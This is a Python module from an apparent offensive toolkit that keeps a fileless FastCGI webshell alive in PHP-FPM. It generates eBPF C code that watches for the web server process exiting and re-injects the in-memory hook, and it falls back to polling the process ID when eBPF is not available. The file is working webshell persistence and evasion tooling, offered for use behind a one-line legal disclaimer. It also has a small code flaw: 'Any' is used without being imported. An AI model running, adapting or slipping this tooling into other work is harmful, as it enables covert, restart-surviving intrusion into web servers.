"""
Ghost WebShell Persistence - In-Memory Watchdog (eBPF)
=======================================================

The fileless FastCGI webshell (`evasion/fileless_webshell.py`) lives only as
long as the PHP-FPM worker process is alive. If the web server restarts,
crashes, or the worker is recycled, the in-memory hook is gone.

The **In-Memory Watchdog** keeps the ghost alive:

  1. eBPF mode (preferred, kernel-level, no polling):
     A BPF program attached to the `sched_process_exit` tracepoint watches
     for the web server process exiting. On match it emits an event to a
     BPF ring buffer; a tiny userspace loop reads it and instantly
     re-injects the FastCGI hook into the freshly-started worker.

  2. Polling fallback (no eBPF / no CAP_BPF):
     A background thread sends `kill(pid, 0)` liveness probes and re-injects
     the moment the target PID disappears.

The re-injection itself reuses `FastCGIInjection`, so persistence is fully
fileless - nothing is written to disk, the watchdog just re-arms the hook.

This module is cross-platform and testable: eBPF C source is generated and
the watchdog supports a simulation path (no real socket / BPF needed).

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import os
import signal
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Callable, Dict, List, Optional

from evasion.fileless_webshell import FastCGIInjection, GhostShellResult


class WatchdogMode(Enum):
    EBPF = "ebpf"
    POLL = "poll"
    SIMULATE = "simulate"


def generate_ebpf_watchdog_c(watch_comm: str = "php-fpm") -> str:
    """
    Generate the eBPF C source for the process-exit watchdog.

    Attaches to the `sched_process_exit` tracepoint and, when a process
    whose comm matches `watch_comm` exits, pushes an event (pid) onto a BPF
    ring buffer. Userspace drains the ring buffer and re-injects the hook.
    """
    return f'''
// Ghost WebShell Watchdog - process-exit monitor (eBPF)
#include <linux/bpf.h>
#include <linux/sched.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";
#define TARGET_COMM "{watch_comm}"

struct exit_event {{
    u32 pid;
    u32 tgid;
    char comm[16];
}};

// Ring buffer consumed by userspace to trigger FastCGI re-injection.
struct {{
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 16);
}} events SEC(".maps");

SEC("tp/sched/sched_process_exit")
int on_proc_exit(struct trace_event_raw_sched_process_template *ctx)
{{
    struct exit_event *e;
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));
    // Only care about the watched web server process.
    if (__builtin_memcmp(comm, TARGET_COMM, sizeof(TARGET_COMM)) != 0)
        return 0;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->tgid = (u32)bpf_get_current_pid_tgid();
    __builtin_memcpy(&e->comm, &comm, sizeof(comm));
    bpf_ringbuf_submit(e, 0);
    return 0;
}}

// Userspace drains `events` and calls the FastCGI re-injection routine
// whenever a matching exit is observed, re-arming the in-memory webshell.
'''


@dataclass
class WatchdogReport:
    mode: str
    reinjections: int
    last_target_pid: Optional[int] = None
    last_result: Optional[GhostShellResult] = None
    notes: List[str] = field(default_factory=list)


class FastCGIWatchdog:
    """
    Keep a fileless FastCGI webshell alive across web-server restarts.

    `inject_fn` is the callable that (re)injects the hook. By default it uses
    `FastCGIInjection(...).inject()`. Tests can pass a fake to avoid sockets.
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 9000,
        script_filename: str = "/var/www/html/index.php",
        watch_pid: Optional[int] = None,
        watch_comm: str = "php-fpm",
        inject_fn: Optional[Callable[[bytes], GhostShellResult]] = None,
        body: bytes = b"<?php phpinfo(); ?>",
        poll_interval: float = 5.0,
        mode: Optional[WatchdogMode] = None,
    ):
        self.host = host
        self.port = port
        self.script_filename = script_filename
        self.watch_pid = watch_pid
        self.watch_comm = watch_comm
        self.body = body
        self.poll_interval = poll_interval

        inj = FastCGIInjection(host, port, script_filename)
        self._default_inject = inj.inject
        self._inject_fn = inject_fn or self._default_inject

        self.mode = mode or (
            WatchdogMode.EBPF if self.check_ebpf_support()["ebpf_available"]
            else WatchdogMode.POLL
        )
        if self.mode == WatchdogMode.EBPF and not self.check_ebpf_support()["ebpf_available"]:
            self.mode = WatchdogMode.POLL

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.reinjections = 0
        self.last_target_pid = watch_pid
        self._report = WatchdogReport(mode=self.mode.value, reinjections=0)

    # ------------------------------------------------------------------
    # eBPF support + source
    # ------------------------------------------------------------------
    def check_ebpf_support(self) -> Dict[str, Any]:
        """Probe eBPF availability (off-target safe)."""
        support: Dict[str, Any] = {
            "ebpf_available": False,
            "bpf_syscall": False,
            "kprobe_support": False,
            "required_caps": ["CAP_SYS_ADMIN", "CAP_BPF", "CAP_PERFMON"],
        }
        try:
            # eBPF needs 3.15+, solid in 4.x+; verify via uname.
            import platform
            parts = platform.release().split(".")[:2]
            major = int(parts[0]) if parts and parts[0].isdigit() else 0
            minor = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
            if (major, minor) >= (4, 0):
                support["ebpf_available"] = True
                support["kprobe_support"] = True
            support["bpf_syscall"] = os.path.exists("/sys/kernel/debug/tracing")
        except Exception:
            pass
        return support

    def generate_ebpf_source(self) -> str:
        """Return the eBPF C source for the watchdog."""
        return generate_ebpf_watchdog_c(self.watch_comm)

    # ------------------------------------------------------------------
    # Re-injection
    # ------------------------------------------------------------------
    def reinject(self) -> GhostShellResult:
        """Re-arm the in-memory webshell (called on target exit)."""
        result = self._inject_fn(self.body)
        self.reinjections += 1
        self._report.reinjections = self.reinjections
        self._report.last_result = result
        return result

    def _target_alive(self, pid: Optional[int]) -> bool:
        if pid is None:
            return True
        try:
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, PermissionError):
            return False
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------
    def run_once(self) -> Optional[GhostShellResult]:
        """
        One watchdog tick. In POLL mode, if the watched PID is dead, re-inject
        and (since a fresh worker likely got a new PID) clear the cached PID
        so the next check treats the new worker as alive until it exits again.
        """
        if self.mode == WatchdogMode.EBPF:
            # In production the eBPF ring buffer drives this; here we treat a
            # missing PID as the trigger so the logic is exercisable.
            if not self._target_alive(self.watch_pid):
                res = self.reinject()
                self.watch_pid = None
                return res
            return None
        # POLL / SIMULATE
        if not self._target_alive(self.watch_pid):
            res = self.reinject()
            self.watch_pid = None
            return res
        return None

    def simulate_exit(self) -> GhostShellResult:
        """Force a re-injection (used by tests / operator trigger)."""
        return self.reinject()

    def start(self):
        """Begin watching in the background."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=2)
            self._thread = None

    def _loop(self):
        while self._running:
            try:
                self.run_once()
            except Exception:
                pass
            time.sleep(self.poll_interval)

    def report(self) -> WatchdogReport:
        return self._report
